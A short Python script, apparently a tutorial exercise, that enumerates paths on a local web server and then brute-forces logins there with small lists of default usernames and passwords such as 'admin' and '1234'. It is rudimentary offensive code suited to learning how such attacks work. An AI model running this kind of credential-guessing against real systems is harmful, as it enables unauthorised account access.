import requests
url = "http://127.0.0.1"
brute_list = ["test","login.php","asdf","a"]
headers={"headers":"no","agent":"doesn't matter"}
proper_list = []
r = requests.get(url)
#print r.text
for i in brute_list:
    r = requests.get(url+"/"+i,headers=headers)
    if r.status_code !=400 and r.status_code != 404:
        proper_list.append( i )
id_list=["admin","test","tutorialspoint"]
pass_list=["0000","password","1234"]
for i in proper_list:
    for j in id_list:
        for k in pass_list:
            data={"login":"whatever","username":j,"password":k}
            r = requests.post(url+"/"+i,data=data)

